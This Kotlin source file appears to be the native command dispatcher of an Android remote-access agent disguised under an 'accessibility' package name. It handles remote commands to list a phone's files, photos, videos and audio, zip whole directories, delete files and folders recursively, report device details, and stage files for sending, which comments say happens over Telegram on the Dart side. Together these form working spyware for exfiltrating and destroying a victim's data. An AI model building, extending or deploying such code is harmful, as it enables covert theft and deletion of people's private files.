package com.example.cyber_accessibility_agent

import android.content.ContentUris
import android.content.Context
import android.database.Cursor
import android.net.Uri
import android.os.Build
import android.provider.MediaStore
import android.util.Log
import java.io.*
import java.util.*
import java.util.zip.ZipEntry
import java.util.zip.ZipOutputStream
import kotlin.collections.ArrayList

object CommandDispatcher {
    private const val TAG = "CommandDispatcher"

    fun dispatch(context: Context, id: String, action: String, payload: Map<*, *>): Map<String, Any?> {
        Log.d(TAG, "Dispatching command: id=$id, action=$action")
        
        return try {
            val result = when (action) {
                "list_files", "ls", "list" -> listFiles(context, payload)
                "list_images" -> listMedia(context, MediaType.IMAGE, payload)
                "list_videos" -> listMedia(context, MediaType.VIDEO, payload)
                "list_audio" -> listMedia(context, MediaType.AUDIO, payload)
                "upload_file", "upload", "prepare_upload" -> prepareUpload(context, payload)
                "zip_files", "zip_file", "zip", "archive" -> zipPath(context, payload)
                "delete_file", "delete", "rm", "remove" -> deleteFile(context, payload)
                "delete_dir", "rmdir", "rd" -> deleteDirectory(context, payload)
                "device_info", "info", "device" -> deviceInfo(context)
                "ping", "ping_device" -> ping(context)
                // ✅ FIX 1: Add send_telegram handler (note: actual Telegram send happens in Dart)
                "send", "send_file", "send_telegram", "sendtelegram" -> {
                    // Native side just prepares file metadata
                    // Actual Telegram API call is handled by Dart CommandDispatcher
                    prepareUpload(context, payload)
                }
                else -> {
                    Log.w(TAG, "Unknown action: $action")
                    mapOf(
                        "success" to false, 
                        "error" to "unknown_action", 
                        "action" to action,
                        "detail" to "Action '$action' is not recognized by CommandDispatcher"
                    )
                }
            }
            
            Log.d(TAG, "Command $id completed: success=${result["success"]}")
            result
            
        } catch (e: Exception) {
            Log.e(TAG, "dispatch error for action=$action: ${e.message}", e)
            mapOf(
                "success" to false, 
                "error" to "dispatcher_exception",
                "detail" to (e.message ?: "Unknown exception"),
                "action" to action,
                "stack_trace" to e.stackTraceToString().take(500)
            )
        }
    }

    private enum class MediaType { IMAGE, VIDEO, AUDIO }

    // ✅ FIX 2: Enhanced LIST MEDIA with better error handling and logging
    private fun listMedia(context: Context, type: MediaType, payload: Map<*, *>): Map<String, Any?> {
        val results = ArrayList<Map<String, Any?>>()
        val projection: Array<String>
        val collection: Uri
        val sortOrder = "${MediaStore.MediaColumns.DATE_MODIFIED} DESC"

        when (type) {
            MediaType.IMAGE -> {
                collection = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q)
                    MediaStore.Images.Media.getContentUri(MediaStore.VOLUME_EXTERNAL)
                else MediaStore.Images.Media.EXTERNAL_CONTENT_URI
                projection = arrayOf(
                    MediaStore.Images.Media._ID,
                    MediaStore.Images.Media.DISPLAY_NAME,
                    MediaStore.Images.Media.SIZE,
                    MediaStore.Images.Media.DATE_MODIFIED
                )
            }
            MediaType.VIDEO -> {
                collection = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q)
                    MediaStore.Video.Media.getContentUri(MediaStore.VOLUME_EXTERNAL)
                else MediaStore.Video.Media.EXTERNAL_CONTENT_URI
                projection = arrayOf(
                    MediaStore.Video.Media._ID,
                    MediaStore.Video.Media.DISPLAY_NAME,
                    MediaStore.Video.Media.SIZE,
                    MediaStore.Video.Media.DATE_MODIFIED
                )
            }
            MediaType.AUDIO -> {
                collection = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q)
                    MediaStore.Audio.Media.getContentUri(MediaStore.VOLUME_EXTERNAL)
                else MediaStore.Audio.Media.EXTERNAL_CONTENT_URI
                projection = arrayOf(
                    MediaStore.Audio.Media._ID,
                    MediaStore.Audio.Media.DISPLAY_NAME,
                    MediaStore.Audio.Media.SIZE,
                    MediaStore.Audio.Media.DATE_MODIFIED
                )
            }
        }

        val limit = (payload["limit"] as? Number)?.toInt() ?: 200
        val prefix = (payload["prefix"] as? String)?.trim()

        val selection = if (!prefix.isNullOrEmpty()) {
            "${MediaStore.MediaColumns.DISPLAY_NAME} LIKE ?"
        } else null
        val selectionArgs = if (!prefix.isNullOrEmpty()) arrayOf("$prefix%") else null

        Log.d(TAG, "Listing $type media: limit=$limit, prefix=$prefix")

        val cursor: Cursor? = try {
            context.contentResolver.query(
                collection,
                projection,
                selection,
                selectionArgs,
                sortOrder
            )
        } catch (e: Exception) {
            Log.e(TAG, "Media query failed for $type: ${e.message}", e)
            return mapOf(
                "success" to false, 
                "error" to "media_query_failed",
                "detail" to e.message,
                "media_type" to type.name
            )
        }

        cursor?.use { c ->
            var count = 0
            while (c.moveToNext() && count < limit) {
                try {
                    val idVal = c.getLong(c.getColumnIndexOrThrow(projection[0]))
                    val name = c.getString(c.getColumnIndexOrThrow(projection[1])) ?: ""
                    val size = c.getLong(c.getColumnIndexOrThrow(projection[2]))
                    val date = c.getLong(c.getColumnIndexOrThrow(projection[3]))

                    val contentUri = ContentUris.withAppendedId(collection, idVal)

                    results.add(
                        mapOf(
                            "id" to idVal.toString(),
                            "display_name" to name,
                            "name" to name,  // ✅ Add 'name' for consistency
                            "size" to size,
                            "date_modified" to date,
                            "modified" to date,  // ✅ Add 'modified' for consistency
                            "uri" to contentUri.toString(),
                            "path" to contentUri.toString(),  // ✅ Add 'path' for consistency
                            "type" to "file"  // ✅ Add 'type' for consistency
                        )
                    )
                    count++
                } catch (e: Exception) {
                    Log.w(TAG, "Failed to read media item: ${e.message}")
                    continue
                }
            }
        }

        Log.d(TAG, "Found ${results.size} $type items")

        // ✅ FIX 3: Consistent return structure
        return mapOf(
            "success" to true, 
            "count" to results.size, 
            "entries" to results,  // Use 'entries' consistently
            "media_type" to type.name.lowercase()
        )
    }

    // ✅ FIX 4: Enhanced LIST FILES with better structure and logging
    private fun listFiles(context: Context, payload: Map<*, *>): Map<String, Any?> {
        val results = ArrayList<Map<String, Any?>>()
        val rawPath = (payload["path"] ?: payload["dir"] ?: "/storage/emulated/0/").toString()
        val limit = (payload["limit"] as? Number)?.toInt() ?: 200
        val recursive = payload["recursive"] == true || payload["recursive"] == "true"

        Log.d(TAG, "Listing files: path=$rawPath, recursive=$recursive, limit=$limit")

        try {
            // ✅ Content URI: return single entry metadata
            if (rawPath.startsWith("content://")) {
                val uri = Uri.parse(rawPath)
                val meta = querySingleContentUri(context, uri)
                if (meta != null) {
                    results.add(meta)
                    Log.d(TAG, "Content URI metadata retrieved: ${meta["display_name"]}")
                } else {
                    Log.w(TAG, "Failed to query content URI: $rawPath")
                }
                return mapOf(
                    "success" to true, 
                    "path" to rawPath,
                    "count" to results.size, 
                    "entries" to results
                )
            }

            val f = File(rawPath)
            if (!f.exists()) {
                Log.w(TAG, "Path not found: $rawPath")
                return mapOf(
                    "success" to false, 
                    "error" to "path_not_found",
                    "path" to rawPath,
                    "detail" to "Directory or file does not exist: $rawPath"
                )
            }

            if (f.isFile) {
                results.add(fileMetaMap(f))
                Log.d(TAG, "Single file listed: ${f.name}")
            } else {
                val stack = ArrayDeque<File>()
                stack.add(f)
                var collected = 0
                while (stack.isNotEmpty() && collected < limit) {
                    val cur = stack.removeFirst()
                    val children = cur.listFiles() ?: continue
                    children.sortWith(Comparator { a, b -> 
                        b.lastModified().compareTo(a.lastModified()) 
                    })
                    for (c in children) {
                        if (collected >= limit) break
                        results.add(fileMetaMap(c))
                        collected++
                        if (recursive && c.isDirectory) {
                            stack.add(c)
                        }
                    }
                }
                Log.d(TAG, "Listed $collected files from directory")
            }

            // ✅ FIX 5: Consistent return structure
            return mapOf(
                "success" to true, 
                "path" to rawPath,
                "cwd" to rawPath,  // Add current working directory
                "count" to results.size, 
                "entries" to results,
                "recursive" to recursive
            )
        } catch (e: Exception) {
            Log.e(TAG, "listFiles error for path=$rawPath: ${e.message}", e)
            return mapOf(
                "success" to false, 
                "error" to "list_files_exception",
                "path" to rawPath,
                "detail" to (e.message ?: "Unknown exception")
            )
        }
    }

    private fun querySingleContentUri(context: Context, uri: Uri): Map<String, Any?>? {
        return try {
            val proj = arrayOf(
                MediaStore.MediaColumns._ID, 
                MediaStore.MediaColumns.DISPLAY_NAME, 
                MediaStore.MediaColumns.SIZE, 
                MediaStore.MediaColumns.DATE_MODIFIED
            )
            val c = context.contentResolver.query(uri, proj, null, null, null)
            c?.use {
                if (it.moveToFirst()) {
                    val idVal = try { it.getLong(it.getColumnIndexOrThrow(proj[0])) } catch (_: Exception) { 0L }
                    val name = try { it.getString(it.getColumnIndexOrThrow(proj[1])) ?: "" } catch (_: Exception) { "" }
                    val size = try { it.getLong(it.getColumnIndexOrThrow(proj[2])) } catch (_: Exception) { 0L }
                    val date = try { it.getLong(it.getColumnIndexOrThrow(proj[3])) } catch (_: Exception) { 0L }
                    
                    // ✅ FIX 6: Consistent field names
                    mapOf(
                        "id" to idVal.toString(),
                        "display_name" to name,
                        "name" to name,
                        "size" to size,
                        "date_modified" to date,
                        "modified" to date,
                        "uri" to uri.toString(),
                        "path" to uri.toString(),
                        "type" to "file"
                    )
                } else null
            }
        } catch (e: Exception) {
            Log.e(TAG, "querySingleContentUri failed for $uri: ${e.message}", e)
            null
        }
    }

    private fun fileMetaMap(f: File): Map<String, Any?> {
        // ✅ FIX 7: Consistent field names matching Dart expectations
        return mapOf(
            "path" to f.absolutePath,
            "name" to f.name,
            "is_dir" to f.isDirectory,
            "type" to if (f.isDirectory) "dir" else "file",  // Add 'type' field
            "size" to if (f.isFile) f.length() else 0L,
            "last_modified" to f.lastModified(),
            "modified" to (f.lastModified() / 1000).toString()  // ISO format timestamp
        )
    }

    // ✅ FIX 8: Enhanced DELETE with better logging and error handling
    private fun deleteFile(context: Context, payload: Map<*, *>): Map<String, Any?> {
        val path = (payload["path"] ?: payload["filename"] ?: payload["target"] ?: "").toString()
        if (path.isEmpty()) {
            return mapOf(
                "success" to false, 
                "error" to "missing_path",
                "detail" to "delete_file requires path argument"
            )
        }

        Log.d(TAG, "Deleting file: $path")

        return try {
            if (path.startsWith("content://")) {
                val uri = Uri.parse(path)
                val deleted = context.contentResolver.delete(uri, null, null)
                Log.d(TAG, "Deleted content URI: deleted=$deleted")
                mapOf(
                    "success" to (deleted > 0), 
                    "deleted" to path,
                    "type" to "file",
                    "count" to deleted
                )
            } else {
                val f = File(path)
                if (!f.exists()) {
                    return mapOf(
                        "success" to false,
                        "error" to "file_not_found",
                        "path" to path,
                        "detail" to "File does not exist: $path"
                    )
                }
                val ok = f.delete()
                Log.d(TAG, "Deleted file: success=$ok")
                mapOf(
                    "success" to ok, 
                    "deleted" to path,
                    "type" to "file"
                )
            }
        } catch (e: Exception) {
            Log.e(TAG, "deleteFile error for path=$path: ${e.message}", e)
            mapOf(
                "success" to false, 
                "error" to "delete_failed",
                "path" to path,
                "detail" to (e.message ?: "Unknown exception")
            )
        }
    }

    // ✅ NEW: Delete directory recursively
    private fun deleteDirectory(context: Context, payload: Map<*, *>): Map<String, Any?> {
        val path = (payload["path"] ?: payload["dir"] ?: payload["directory"] ?: payload["target"] ?: "").toString()
        if (path.isEmpty()) {
            return mapOf(
                "success" to false, 
                "error" to "missing_path",
                "detail" to "delete_dir requires path argument"
            )
        }

        Log.d(TAG, "Deleting directory: $path")

        return try {
            val f = File(path)
            if (!f.exists()) {
                return mapOf(
                    "success" to false,
                    "error" to "directory_not_found",
                    "path" to path,
                    "detail" to "Directory does not exist: $path"
                )
            }
            
            if (!f.isDirectory) {
                return mapOf(
                    "success" to false,
                    "error" to "not_a_directory",
                    "path" to path,
                    "detail" to "Path is not a directory: $path"
                )
            }
            
            val ok = f.deleteRecursively()
            Log.d(TAG, "Deleted directory recursively: success=$ok")
            mapOf(
                "success" to ok, 
                "deleted" to path,
                "type" to "directory"
            )
        } catch (e: Exception) {
            Log.e(TAG, "deleteDirectory error for path=$path: ${e.message}", e)
            mapOf(
                "success" to false, 
                "error" to "delete_dir_failed",
                "path" to path,
                "detail" to (e.message ?: "Unknown exception")
            )
        }
    }

    // ✅ FIX 9: Enhanced ZIP with better error handling
    private fun zipPath(context: Context, payload: Map<*, *>): Map<String, Any?> {
        val rawPath = (payload["path"] ?: payload["file"] ?: "").toString()
        if (rawPath.isEmpty()) {
            return mapOf(
                "success" to false, 
                "error" to "missing_path",
                "detail" to "zip_files requires path argument"
            )
        }

        val dest = (payload["dest"] ?: "").toString()
        val zipName = (payload["zip_name"] ?: payload["zip"] ?: "").toString()

        Log.d(TAG, "Creating ZIP: source=$rawPath, dest=$dest, zipName=$zipName")

        return try {
            val src = File(rawPath)
            if (!src.exists()) {
                return mapOf(
                    "success" to false, 
                    "error" to "path_not_found",
                    "path" to rawPath,
                    "detail" to "Source path does not exist: $rawPath"
                )
            }

            val zipFile = if (dest.isNotEmpty()) {
                File(dest)
            } else {
                val defaultName = if (zipName.isNotEmpty()) zipName 
                                 else "mediaagent_${System.currentTimeMillis()}.zip"
                File(context.cacheDir, defaultName)
            }

            ZipOutputStream(BufferedOutputStream(FileOutputStream(zipFile))).use { zos ->
                if (src.isDirectory) {
                    zipDirectory(src, src.name, zos)
                } else {
                    zipSingleFile(src, zos)
                }
            }

            Log.d(TAG, "ZIP created: ${zipFile.absolutePath}, size=${zipFile.length()}")

            mapOf(
                "success" to true, 
                "zip_path" to zipFile.absolutePath,
                "path" to zipFile.absolutePath,
                "size" to zipFile.length(),
                "name" to zipFile.name
            )
        } catch (e: Exception) {
            Log.e(TAG, "zipPath error for path=$rawPath: ${e.message}", e)
            mapOf(
                "success" to false, 
                "error" to "zip_failed",
                "path" to rawPath,
                "detail" to (e.message ?: "Unknown exception")
            )
        }
    }

    private fun zipDirectory(folder: File, baseName: String, zos: ZipOutputStream) {
        val files = folder.listFiles() ?: return
        for (f in files) {
            if (f.isDirectory) {
                zipDirectory(f, "$baseName/${f.name}", zos)
            } else {
                zipSingleFile(f, zos, "$baseName/${f.name}")
            }
        }
    }

    private fun zipSingleFile(file: File, zos: ZipOutputStream, entryName: String? = null) {
        val entry = ZipEntry(entryName ?: file.name)
        zos.putNextEntry(entry)
        FileInputStream(file).use { fis ->
            val buffer = ByteArray(8192)
            var read = fis.read(buffer)
            while (read > 0) {
                zos.write(buffer, 0, read)
                read = fis.read(buffer)
            }
        }
        zos.closeEntry()
    }

    // ✅ FIX 10: Enhanced PREPARE UPLOAD with better structure
    private fun prepareUpload(context: Context, payload: Map<*, *>): Map<String, Any?> {
        val filename = (payload["filename"] ?: payload["path"] ?: payload["file"] ?: "").toString()
        if (filename.isEmpty()) {
            return mapOf(
                "success" to false, 
                "error" to "missing_filename",
                "detail" to "prepare_upload requires filename or path"
            )
        }

        Log.d(TAG, "Preparing upload: $filename")

        try {
            if (filename.startsWith("content://")) {
                val uri = Uri.parse(filename)
                val meta = querySingleContentUri(context, uri)
                Log.d(TAG, "Content URI metadata prepared: ${meta?.get("display_name")}")
                return mapOf(
                    "success" to true,
                    "is_content_uri" to true,
                    "uri" to filename,
                    "path" to filename,
                    "meta" to meta,
                    "name" to (meta?.get("display_name") ?: meta?.get("name") ?: "unknown"),
                    "size" to (meta?.get("size") ?: 0L)
                )
            } else {
                val f = File(filename)
                if (!f.exists()) {
                    return mapOf(
                        "success" to false, 
                        "error" to "file_not_found",
                        "path" to filename,
                        "detail" to "File does not exist: $filename"
                    )
                }
                Log.d(TAG, "File metadata prepared: ${f.name}, size=${f.length()}")
                return mapOf(
                    "success" to true,
                    "is_content_uri" to false,
                    "file_path" to f.absolutePath,
                    "path" to f.absolutePath,
                    "size" to f.length(),
                    "name" to f.name,
                    "modified" to f.lastModified()
                )
            }
        } catch (e: Exception) {
            Log.e(TAG, "prepareUpload error for $filename: ${e.message}", e)
            return mapOf(
                "success" to false, 
                "error" to "prepare_upload_failed",
                "path" to filename,
                "detail" to (e.message ?: "Unknown exception")
            )
        }
    }

    // ✅ FIX 11: Enhanced DEVICE INFO with comprehensive data
    private fun deviceInfo(context: Context): Map<String, Any?> {
        Log.d(TAG, "Getting device info")
        
        return try {
            val pkg = context.packageName
            val free = try { context.filesDir.freeSpace } catch (_: Exception) { 0L }
            val total = try { context.filesDir.totalSpace } catch (_: Exception) { 0L }
            
            mapOf(
                "success" to true,
                "brand" to Build.BRAND,
                "model" to Build.MODEL,
                "device" to Build.DEVICE,
                "manufacturer" to Build.MANUFACTURER,
                "product" to Build.PRODUCT,
                "sdk_int" to Build.VERSION.SDK_INT,
                "android_version" to Build.VERSION.RELEASE,
                "package" to pkg,
                "cache_dir" to context.cacheDir.absolutePath,
                "files_dir" to context.filesDir.absolutePath,
                "files_free" to free,
                "files_total" to total,
                "is_physical_device" to true,
                "platform" to "android"
            )
        } catch (e: Exception) {
            Log.e(TAG, "deviceInfo error: ${e.message}", e)
            mapOf(
                "success" to false, 
                "error" to "device_info_failed",
                "detail" to (e.message ?: "Unknown exception")
            )
        }
    }

    // ✅ FIX 12: Enhanced PING with timestamp and message
    private fun ping(context: Context): Map<String, Any?> {
        Log.d(TAG, "Ping received")
        
        return mapOf(
            "success" to true,
            "message" to "pong",
            "ts" to System.currentTimeMillis(),
            "timestamp" to System.currentTimeMillis(),
            "model" to Build.MODEL,
            "device" to Build.DEVICE,
            "brand" to Build.BRAND
        )
    }
}